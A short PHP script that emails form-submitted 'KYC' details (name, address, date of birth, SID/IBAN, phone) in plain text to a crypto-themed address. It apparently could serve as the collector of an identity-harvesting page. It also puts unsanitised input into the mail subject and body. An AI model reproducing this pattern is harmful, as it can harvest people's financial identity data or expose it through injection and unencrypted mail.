<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $fname = $_POST["fname"];
    $lname = $_POST["lname"];
    $addr = $_POST["addr"];
    $dob = $_POST["dob"];
    $sid = $_POST["sid"];
    $num = $_POST["num"];
    
    // Email settings
    $to = "admin@crypto-lux.ltd";
    $subject = "KYC Submission - $fname $lname";
    $message = "First Name: $fname\nLast Name: $lname\nAddress: $addr\nDOB: $dob\nSID/IBAN: $sid\nPhone Number: $num";

    // Send email
    $success = mail($to, $subject, $message);

    // Return success or error status
    if ($success) {
        echo "success";
    } else {
        echo "error";
    }
} else {
    // Invalid request
    echo "Invalid request";
}
?>
